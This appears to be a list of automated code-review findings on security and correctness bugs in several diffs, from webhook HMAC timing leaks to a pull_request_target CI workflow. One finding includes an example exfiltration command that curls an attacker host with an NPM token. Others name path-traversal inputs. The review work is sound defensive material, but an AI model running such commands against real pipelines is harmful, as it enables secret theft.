findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guards (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false` on a bucket named `acme-customer-invoices`. This is the same configuration as the intentionally-public `assets` bucket, but invoice data is not public content.

With these off, any public-read ACL or bucket policy — set by a later apply, a console change, or a misconfigured upload client — will take effect rather than being rejected by the account/bucket guardrail. Nothing else in this file restricts access to the bucket.

Unless the bucket must serve anonymous traffic, either delete this resource (so the account-level block applies) or set all four attributes to `true`. If some narrow public path is genuinely needed, scope it with an explicit bucket policy and keep `block_public_acls`/`ignore_public_acls` enabled.

_Also raised by the correctness agent:_ Invoices bucket disables all S3 public access protections

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` is a copy of `verify_stripe` but ends with `expected == header` rather than `hmac.compare_digest(expected, header)`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading characters of the caller-supplied `header` match the expected digest, allowing an attacker who controls `header` and can time responses to recover a valid signature byte by byte. Use `hmac.compare_digest(expected, header)` here, exactly as on line 7.

A secondary consequence of the divergence: the two functions no longer behave the same on malformed input. `compare_digest` raises `TypeError` for a `None` or non-ASCII-str `header`, while `==` silently returns `False`. Any caller that relies on the stripe function's exception path (or, conversely, on never seeing an exception) will see different behaviour depending on which provider it dispatches to.

_Also raised by the security agent:_ Webhook HMAC compared with `==` (timing-unsafe)

findings.title: New signature verification function has no test coverage
findings.body: verify_acmepay is new security-sensitive code (webhook signature verification) with no accompanying test. A test would need to check the timing-safe comparison behavior or at least correctness of accept/reject; without it, nothing catches the use of == instead of hmac.compare_digest, or any future regression in this function.

findings.title: Exception text and traceback returned to the client
findings.body:
`handle()` is the generic 500 handler and now serialises `str(exc)` plus `traceback.format_exc()` into the response body. Anyone who can provoke an unhandled exception — typically trivial via malformed input to any endpoint routed through this handler — receives absolute file paths, module and function names, library versions implied by frame paths, and often fragments of the offending data (e.g. SQL text in a DBAPI error, a connection string in a connect failure, key material or tokens embedded in an exception message). That is a reconnaissance gift for an attacker probing the service and, in the credential-bearing exception case, an outright secret disclosure.

Keep the traceback on the server side only — `log.exception("request failed")` on line 8 already records it. Restore the opaque client payload and, if debuggability is the goal, return a correlation id that maps to the log entry:

```python
error_id = uuid.uuid4().hex
log.exception("request failed", extra={"error_id": error_id})
return {"error": "internal error", "error_id": error_id}, 500
```

If verbose output is genuinely wanted in development, gate it behind an explicit debug setting that defaults to off rather than making it unconditional.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and reads ambient exception state

_Also raised by the correctness agent:_ Error response body shape and content changed for all callers

findings.title: No test asserts contents of error response body
findings.body: The change alters what `handle()` returns to the client (now including exception text and full traceback instead of a generic message). No test file is part of this diff, so nothing would catch a regression here — e.g. if this were reverted, or if it leaked even more sensitive data, existing tests (if any) would still pass since none appear to assert on the response payload of `handle()`.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password value with a single unsalted MD5 pass. MD5 is a fast, GPU-friendly hash with no salt and no work factor, so any dump of these values is trivially reversible by rainbow table or brute force, and identical passwords produce identical digests. The same module already has the correct primitive on line 7 (`bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`). Unless this function is verifying against some legacy store, it should simply call `hash_password(raw)` / `bcrypt.hashpw` so the reset path produces the same class of hash as registration. If it does exist for legacy compatibility, it should be documented as verify-only and upgrade-on-login, never used to write new values.

Entry point is not visible here: the caller that feeds `raw` (presumably a password-reset HTTP handler) is not in the diff or in the retrieved context, so I cannot confirm the digest is persisted rather than compared. The weakness is in the primitive itself either way.

findings.title: Public password function lacks contract documentation for MD5 use
findings.body: The `hash_reset_password` function is a public API (exported at module level, named with a clear public intent) that uses MD5 for password-related material. Callers cannot determine from the function name and signature alone whether MD5 is intentional (for a token that is short-lived and not the primary auth method) or a bug. Without documentation explaining the narrower threat model or constraints that make MD5 acceptable here, a maintainer or caller could incorrectly assume this follows the bcrypt pattern of `hash_password` and use it for primary password storage, or could apply it to other contexts where it is cryptographically inadequate. Document the specific use case and why a weaker hash is acceptable.

findings.title: Reset path stores MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is self-describing and verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char MD5 hex digest with no algorithm prefix and no salt. Both evidently feed the same stored-password field, but the two formats are not interchangeable: `bcrypt.checkpw(raw, md5_hex)` raises/fails, so a user who goes through the reset path can no longer log in — unless the verifier has a silent fallback that compares MD5, which would mean every reset password is stored unsalted and offline-crackable. Either outcome is a defect. The reset path should call `hash_password` (bcrypt) so the stored format stays uniform; if a distinct token hash is genuinely needed, it should not share the password column and should be named and typed accordingly.

findings.title: New hash_reset_password function has no test coverage
findings.body: hash_reset_password is a new behavior (MD5-based hashing for reset tokens/passwords) with no accompanying test. If this function were changed or broken (e.g. wrong encoding, wrong algorithm, or a security fix swapping MD5 for something else), nothing in the suite would fail. Since this is a security-sensitive path, at minimum a test asserting expected output format/determinism would catch regressions.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
Under `pull_request_target` the job runs in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with the repository's default (typically write) permissions, and it runs without the approval gate that fork PRs get under `pull_request`.

Line 12 then deliberately checks out `github.event.pull_request.head.sha` — the untrusted fork commit — and line 13 executes `./scripts/measure.sh` from that checkout with `NPM_TOKEN` in its environment (line 15). An attacker simply opens a pull request from a fork whose `scripts/measure.sh` is replaced with `curl attacker.example/$NPM_TOKEN` (or anything reading `$GITHUB_TOKEN`, pushing tags, or poisoning the cache). No maintainer interaction is required beyond the PR being opened.

Options, roughly in order of preference:

1. Revert to `on: pull_request`. A size check does not need repository secrets or write access; if the measurement needs to post a comment, split it into a second `workflow_run`-triggered job that consumes an artifact and never executes fork code.
2. If `pull_request_target` must stay, do **not** check out the head SHA and do not run any script, config, or dependency lifecycle hook that comes from the fork. Restrict to the base ref only.
3. At minimum, never place `secrets.NPM_TOKEN` in the environment of a step that runs fork-authored code, and add an explicit `permissions:` block reducing `GITHUB_TOKEN` to `contents: read`.

Note also that even if `measure.sh` itself were pinned to the base ref, the fork controls everything it reads — `package.json` scripts, lockfiles, config files — so an install/build inside it is equally exploitable.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with NPM_TOKEN

findings.title: Workflow definition now comes from base, not the PR under test
findings.body: Under `pull_request_target` the workflow file itself is always taken from the base branch, while line 12 pins the *code* checkout to the PR head. The result is a split-brain run: changes a PR makes to `.github/workflows/size.yml` are never exercised by that PR, so a contributor editing the size check cannot see the effect of their own change and a broken edit only surfaces after merge. Related: the `github.ref`/`GITHUB_SHA` context seen by `./scripts/measure.sh` now points at the base branch even though the working tree is the head commit, so any logic in the script that derives a ref from the environment rather than from the working tree will silently compare the wrong things.

findings.title: json.dumps raises TypeError for contexts the old key accepted
findings.body:
The previous key was `(template_source, tuple(sorted(context.items())))`, which accepted any *hashable* context value \u2014 `datetime`, `Decimal`, `UUID`, enum members, frozen dataclasses, arbitrary objects with default hashing. `json.dumps` accepts only *JSON-serialisable* values, so every one of those callers now gets an uncaught `TypeError: Object of type X is not JSON serializable` from `cached_render`, on the very first call, before any rendering happens. This turns a working render into a hard failure for any caller that passes a non-primitive in the context.

If the intent is a digest key, serialise defensively \u2014 e.g. `json.dumps(..., default=repr)` (or a `default=` that raises only for genuinely ambiguous types) \u2014 or fall back to the old tuple key when serialisation fails. The new tests only exercise `int` values, so this regression is invisible to the suite as written; a test passing a `datetime` in the context would pin it.

findings.title: `directory` is no longer shell-expanded; globs/multi-path callers break
findings.body:
Previously `directory` was interpolated into a shell command line, so a caller could legitimately pass a glob (`/srv/data/*`), several paths (`/srv/a /srv/b`), or `~/data`, and the shell would expand/split it before `tar` saw it. With the list argv the whole string is a single literal path operand, and `--` guarantees it is never re-interpreted. Any such caller now gets `tar: ...: Cannot stat: No such file or directory` and a `CalledProcessError` from `check=True` — a runtime failure in the archive job, not a compile-time one.

Since no callers were retrieved, please grep for `create_archive(` and confirm every call site passes exactly one concrete directory path. If multiple paths are a real use case, accept a sequence and splat it into the argv (`["tar", "-czf", dest, "--", *directories]`) rather than relying on splitting.

findings.title: Test only checks shell=False kwarg, not the actual argv list
findings.body: test_runs_without_a_shell asserts spy.last_call.kwargs["shell"] is False but never inspects the positional args (the tar command list) that were actually passed. The real security fix in archive.py is passing directory and the archive name as separate list elements (['tar', '-czf', f'/exports/{name}.tar.gz', '--', directory]) rather than interpolating them into a single shell string. If a future change kept shell=False but reverted to building a single interpolated string argument (e.g. subprocess.run(f'tar ... {directory}', shell=False)), this test would still pass even though the injection-safety property it's meant to guard is gone, because it never asserts on spy.last_call.args.

findings.title: `directory` reaches tar unvalidated; may allow reading arbitrary paths
findings.body:
`name` is now strictly allowlisted, but `directory` flows straight from the caller into the tar argv on line 12 with no validation. Shell injection and option injection are both closed (list argv, `--` separator), so this is not command execution. What remains is path control: if any caller passes a user-supplied value, an attacker can name `/etc`, `/root/.ssh`, or `../../` relative paths and have their contents written into a world-readable-ish archive under `/exports/`, which is then presumably downloadable by whoever requested it. Symlinks inside the tree are also followed by default.

If `directory` is always an internal constant or a server-derived path, this is nothing. If it can come from a request, constrain it: resolve it and assert it lives under an expected root before invoking tar, and consider `--dereference`-off semantics for symlinked entries.

findings.title: New ValueError rejects names that previously worked (dots, colons, >64 chars)
findings.body:
The allowlist is `[A-Za-z0-9_-]{1,64}` under `fullmatch`, so any name containing `.`, `:`, `/` or a space, or longer than 64 characters, now raises `ValueError`. Date-stamped names are the common case here — `"2024-05-01T02:00"`, `"nightly.v2"`, `"tenant.acme"` all produced a valid archive before this change and now raise. `ValueError` is a new exception type on this code path; existing callers that only guard against `subprocess.CalledProcessError` will propagate it and fail the job.

This is not an argument against the allowlist — just confirm the real name space at the call sites, and consider allowing `.` and `:` (neither is dangerous once `shell=False` and the name cannot contain `/` or `..`), plus a length bound that matches actual usage.

Related boundary: `name=None` or a non-string reaches `fullmatch` and raises `TypeError`, not the documented `ValueError`.

findings.title: test_renders_empty_invoice has no assertion

findings.title: csv_rows joins values without applying csv_escape
findings.body:
`csv_rows` renders each cell as `str(r.get(c, ""))` and joins with `","`, so a value containing a comma (e.g. `{"city": "Paris, FR"}`) emits an extra field and shifts every subsequent column; a value containing `"` emits an unbalanced quote. The escaping routine for exactly this case is added five lines below but is never called. Route the cell through it, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note that `csv_escape` does membership tests directly on `value`, so it raises `TypeError` for non-string input and needs the `str(...)` coercion kept on the caller side (or moved inside the helper). findings.title: Date-equality assertion flakes across the UTC midnight boundary
findings.body:
`issue_token()` samples the clock internally, then line 11 samples it again via `datetime.now(timezone.utc)` and compares only the calendar date. Any run where the first sample lands at 23:59:59.9xx UTC and the second lands after midnight produces two different dates and the test fails, with no code change involved. This is a check-then-act race against the wall clock.

Fix by removing the second clock read: either inject a fixed `now` into `issue_token()` the way the test above injects `now=` into `is_expired`, or assert a tolerance instead of date equality, e.g. capture `before = datetime.now(timezone.utc)` prior to issuing and assert `before <= token.issued_at <= datetime.now(timezone.utc)`.

Line 12 has a related weakness: `is_expired(token.expires_at)` is called without the `now=` argument that line 6 passes explicitly, so this assertion depends on the real clock and on an unseen default rather than on a controlled value.

findings.title: expires_at may be None or naive, making the comparison raise
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` assumes every coupon has a non-null, timezone-aware `expires_at`. If a coupon has no expiry (`None`), this raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime'`; if the stored value is naive (common when loaded from a DB column without timezone), it raises `TypeError: can't compare offset-naive and offset-aware datetimes`. The test change on the test side only supplies an aware `tomorrow()`, so neither case is exercised.

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body: `fetch_plan_limits` is `async` but never awaits anything; `requests.get` is a synchronous, blocking call. Awaiting this coroutine gives the event loop no suspension point, so the whole loop \u2014 every other in-flight request on that worker \u2014 is frozen for the duration of the billing call, up to the 5s timeout (longer if DNS/TCP connect hangs, since `timeout` in requests does not bound total wall time across redirects). The sibling `fetch_plan` on line 5-7 shows the intended pattern. Use the injected `httpx.AsyncClient` (or a module-level async client) and `await client.get(...)`; if a sync client is unavoidable, wrap it in `anyio.to_thread.run_sync` / `loop.run_in_executor`.

However, line 11 executes `requests.get()`, which is a blocking synchronous HTTP call. Callers awaiting this function will block the event loop, defeating the purpose of the async declaration. Either make the function synchronous (remove `async`), or use an async HTTP client like `httpx` to match the pattern in `fetch_plan` above.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is formatted directly into the path of an internal, presumably unauthenticated-on-the-network service (`https://billing.internal/limits/{tenant_id}`). If `tenant_id` can carry `/` or `..` (e.g. `1/../../admin/keys`), the caller controls which path on `billing.internal` is fetched; `requests` also follows redirects by default, so a crafted path hitting a redirecting endpoint can pull the request elsewhere. The host is fixed, so this is path manipulation against the internal service rather than full SSRF.

Fix by quoting the segment, e.g. `urllib.parse.quote(str(tenant_id), safe="")`, or by validating `tenant_id` against the expected format (int / UUID) before building the URL. Consider `allow_redirects=False` for an internal RPC-style call.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit
findings.body: `except:` catches `BaseException`, not just `Exception`. If a Ctrl-C arrives while `_client.send(payload)` is blocked on network I/O — which is precisely when it is most likely to be interrupted — the `KeyboardInterrupt` is discarded and `push_metrics` returns `None` as though the push merely failed. The same applies to `SystemExit` raised during interpreter shutdown, and to `GeneratorExit`. The intent stated in the PR is to make the push non-fatal, which only requires `except Exception:`. Change line 4 to `except Exception:` so control-flow exceptions propagate.

This behavior change—especially the silent failure mode—should be documented via a docstring so callers understand they cannot rely on exceptions to signal errors.

findings.title: try_consume reads and writes shared counters across an await without the lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await` on line 18, and only then writes on line 19 — all outside `_lock`, which `consume` (lines 9-11) does hold for the same dict. Two tasks for the same tenant can both observe `current` below the limit, both pass the check on line 16, and both commit, allowing total usage to exceed `LIMIT` by up to `cost` per concurrent caller. Worse, line 19 writes an absolute value computed from the stale `current`, so any increment applied by `consume` (or another `try_consume`) during the `await` is silently discarded — the counter can go backwards and the limit stops being enforced at all.

Fix by holding the same lock over the whole read-check-write sequence, e.g. `async with _lock:` around lines 15-20 with no awaits on shared state inside beyond the ones under the lock, and by writing via a fresh read (`_counters[tenant] = _counters.get(tenant, 0) + cost`) rather than from the pre-await snapshot.

_Also raised by the security agent:_ Rate limit bypassable: check-then-act on _counters without _lock

findings.title: No test would catch the try_consume race condition
findings.body: try_consume reads _counters (line 15), awaits asyncio.sleep(0) (line 18), then writes _counters (line 19) without holding _lock, unlike consume() which uses the lock for the whole check-then-act sequence. Concurrent calls for the same tenant can both pass the limit check and both write, allowing the counter to exceed LIMIT. There is no test in this diff that exercises concurrent calls to try_consume, so this race would go undetected.

findings.title: Docstring describes old return shape (tuple, not dict)

The docstring states `Return (name, email) for a user.` but the function now returns `{"name": ..., "email": ..., "tier": ...}`. This is a contract break. Callers reading only the docstring will unpack the result as a tuple and receive a dict instead, causing a runtime error. The docstring must be updated to describe the new shape.

findings.title: Return shape change breaks existing tuple-unpacking caller

The existing caller `render_row` in reports/weekly.py does `name, email = lookup_user(user_id)`. Unpacking a 3-key dict into two names raises `ValueError: too many values to unpack (expected 2)` on every call, so that report path fails at runtime rather than degrading. Either update `render_row` (and any other callers) to `result = lookup_user(...); result["name"], result["email"]`, or keep the tuple contract and add `tier` as a third element / a separate function so callers can migrate deliberately. Note that even if the dict had exactly two keys, unpacking would yield the key strings, not the values — so no dict shape silently satisfies the old caller.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body: The `err` bound by `if _, err := db.Exec(...); err != nil` is scoped to the `if` statement; the failure is only logged. Line 18 then declares a brand-new `var err error` (always nil) and line 19 returns it, so `WriteSettlement` reports success for every call, including when the INSERT fails (constraint violation, connection loss, deadlock). Callers cannot distinguish a written settlement from a lost one, and a financial record silently disappears. Mirror the sibling `WriteEntry` on lines 7-8: `if _, err := db.Exec(...); err != nil { log.Printf(...); return err }` and drop the `var err error` / `return err` pair (or `return nil`).

findings.title: Public function WriteSettlement lacks contract documentation
findings.body: WriteSettlement is a public API that exhibits unusual error-handling behavior: it logs errors from the database operation but always returns nil (line 18-19). This contract is not documented, and callers cannot determine from the signature alone whether errors are returned, swallowed, or logged. A competent caller expecting error handling would be misled into believing database failures would be reported, when in fact they are silently logged and the function returns success.

findings.title: No test covers WriteSettlement's dropped-error behavior
findings.body: WriteSettlement always returns nil regardless of whether the DB insert fails (the err from db.Exec is only logged, then a fresh nil `err` variable is declared and returned). No test exists for this function, so a caller relying on the returned error to detect a failed settlement insert would never notice — the function silently reports success on every insert failure. A test asserting that WriteSettlement returns a non-nil error when the underlying db.Exec fails (e.g. via a mock/sqlmock DB) would catch this regression.

findings.title: Mutable default `attempted=[]` accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that does not pass `attempted` explicitly shares the same list object. Line 10 appends to it and line 11 returns it, so the second call to `send_with_retries(recipients)` returns the failures from the first call as well, and the list grows without bound for the lifetime of the process (also a slow memory leak in a long-running service). Callers that do `failed = send_with_retries(rs)` and branch on `if failed:` will see stale failures and may re-report or re-send.

Use the same idiom the function two lines above already uses: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted) if attempted is not None else []` (or `attempted = attempted if attempted is not None else []` if mutating a caller-supplied list is intended).

_Also raised by the security agent:_ Shared mutable default leaks recipients across unrelated calls

findings.title: compute_rounding flips >= to >, dropping exact half-cent rounding
findings.body:
The rename diff also changed the comparison in the rounding function from `line.remainder_cents >= 0.5` to `> 0.5`. For the exact boundary value `remainder_cents == 0.5` the function now returns 0 instead of 1, i.e. banker-less round-half-down instead of round-half-up. Exact halves are the single most common remainder in cent-denominated billing (any split of an odd number of cents in two), so this is reachable in ordinary use and will systematically under-bill or under-credit by one cent. No other line in this diff changed behaviour, so this looks unintentional — restore `>=` unless a deliberate rounding-policy change is intended, in which case it belongs in its own commit with a test.

findings.title: Off-by-one in page_of_sorted silently drops a record per page
findings.body:
The slice end should be `start + PAGE_SIZE`, matching `page_of` on line 6. As written, each page yields at most `PAGE_SIZE - 1` records while `start` still advances by `PAGE_SIZE` per page (line 11), so the record at index `start + PAGE_SIZE - 1` is omitted from the current page and is never included in the next page either — it is dropped from the export entirely. For an export endpoint this is silent data loss for one record out of every PAGE_SIZE. Change line 12 to `return ordered[start : start + PAGE_SIZE]`.

findings.title: Removed None guard: header_lines crashes when purchase_order is None
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as optional ("only set for customers on invoicing terms, which is roughly one account in twenty"). The previous code guarded with `if invoice.purchase_order is not None:` before calling `.upper()`. The rewritten list literal calls `invoice.purchase_order.upper()` unconditionally on line 4, so every invoice without a PO — the ~95% case — raises `AttributeError: 'NoneType' object has no attribute 'upper'` and no header renders at all.

Restore the conditional append, or build the list and only add the PO line when the value is present, e.g.:

```python

    lines = [f"Invoice {invoice.number}"]
    if invoice.purchase_order is not None:
        lines.append(f"PO {invoice.purchase_order.upper()}")
    return lines
```

findings.title: File handle leaks when header validation fails
findings.body:
`fh = open(path)` on line 10 is only closed on line 16, which is reached solely on the success path. When `header != expected_header`, line 14 returns `None` with the handle still open, so it is only reclaimed whenever CPython's refcounting happens to drop it (and on PyPy, not deterministically at all). The same leak occurs if `next(reader)` or `list(reader)` raises (decode error, malformed CSV field, or `StopIteration` on an empty file).

Use the same pattern as `read_rows` directly above:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        header = next(reader, None)
        if header != expected_header:
            return None
        return list(reader)
```

This closes the handle on every exit path, and `next(reader, None)` also makes the empty-file case return `None` rather than propagating `StopIteration`.

findings.title: Public function lacks contract documentation

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs after the gateway has already created the charge \u2014 a timeout, a dropped connection, a 5xx returned after commit \u2014 causes the decorator to POST again, producing two or three real charges for one logical payment. Note that `fetch_charge` above is a GET and is correctly safe to retry, so the same decorator is being applied to two operations with very different safety properties.

Fix: generate a stable idempotency key per logical payment (caller-supplied, not generated inside the retried function, or it will differ per attempt) and pass it through to the gateway via the documented `Idempotency-Key` header. Only then is the retry safe. If threading the key through is out of scope for this change, drop the decorator from `charge_card` and let the caller decide.

_Also raised by the security agent:_ retry on non-idempotent charge() can double-bill without Idempotency-Key

Applying `@retry` to a non-idempotent operation is dangerous and can cause duplicate charges. The gateway's own `charge()` docstring states that an Idempotency-Key header is required to make retries safe. `charge_card()` has no documentation explaining this precondition or warning callers about the safety requirements. A caller using this function without understanding the idempotency-key requirement could trigger duplicate charges on network failures.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` with no argument returns a naive local-time datetime. `Invite.expires_at` is documented as always tz-aware UTC (see models/invite.py), and the sibling function `is_expired` on line 5 correctly uses `datetime.now(timezone.utc)`. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so line 10 fails on every call, for every input.

Fix: `cutoff = datetime.now(timezone.utc).replace(microsecond=0)`. Note that even if the subtraction were permitted, a naive local `now()` would be off by the host's UTC offset, silently shifting the window by hours on any non-UTC machine.

findings.body:
The `fetch()` function's default `retries` parameter has been lowered from 5 to 1. However, `sync/nightly.py` documents that it deliberately relies on fetch()'s default retry count to survive a known flaky dependency (INC-4471). This change breaks that contract without updating the documentation or providing an alternative.

Either restore the default to 5, explicitly pass `retries=5` in the partner catalogue sync call, or update the `sync_partner_catalogue()` docstring to explain why it no longer works.

findings.title: Lowered default retries breaks sync_partner_catalogue (INC-4471)
findings.body:
`fetch()`'s default `retries` drops from 5 to 1. `sync/nightly.py:sync_partner_catalogue()` calls `fetch("https://partner.example.com/catalogue")` with no `retries` argument and its docstring states the partner API returns 503 about one call in three during the nightly window, and that relying on the default retry count was the deliberate fix for INC-4471. With one retry, the chance of the nightly sync failing rises from roughly 1/3^5 (~0.4%) to 1/3^2 (~11%), regressing that incident.

Either keep the default at 5, or make the dependence explicit at the call site by passing `retries=5` in `sync_partner_catalogue()` as part of this change. A grep for other no-`retries` callers is worth doing before merging, since the change silently alters behaviour for all of them.

findings.title: No test guards fetch()'s default retry count relied on by sync_partner_catalogue
findings.body: The default for `retries` was lowered from 5 to 1. `sync/nightly.py` explicitly documents (INC-4471) that it depends on fetch()'s default retry count to survive a partner API that returns 503 roughly one in three calls. There is no test in this diff, and apparently none in the repo, that calls `fetch()` with default arguments and asserts it retries enough times to succeed against a flaky/503-returning dependency. If this default is wrong or regresses, nothing would fail until the nightly sync job fails in production again.

findings.title: Duplicate index: same columns as invoices_tenant_created_idx (0007)
findings.body:
`invoices_tenant_created_idx2` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same key and sort direction as `invoices_tenant_created_idx`, created in `migrations/0007_invoice_indexes.sql` and already applied 2025-11-02. Postgres will not reject it because the name differs, so this will apply cleanly and silently: every INSERT/UPDATE/DELETE on `invoices` then maintains two identical B-trees, and the build itself takes an ACCESS EXCLUSIVE-blocking write lock (no `CONCURRENTLY`) for the duration on what is presumably a large table.

Drop lines 7-8 from this migration; the planner will use the existing index for the reporting query. If the intent was a different shape (e.g. a partial index, `INCLUDE` columns, or `created_at ASC`), make that explicit in the definition, because as written it is not distinguishable from the 0007 index.

findings.title: Referer logged unscrubbed, leaking auth tokens into logs
findings.body:
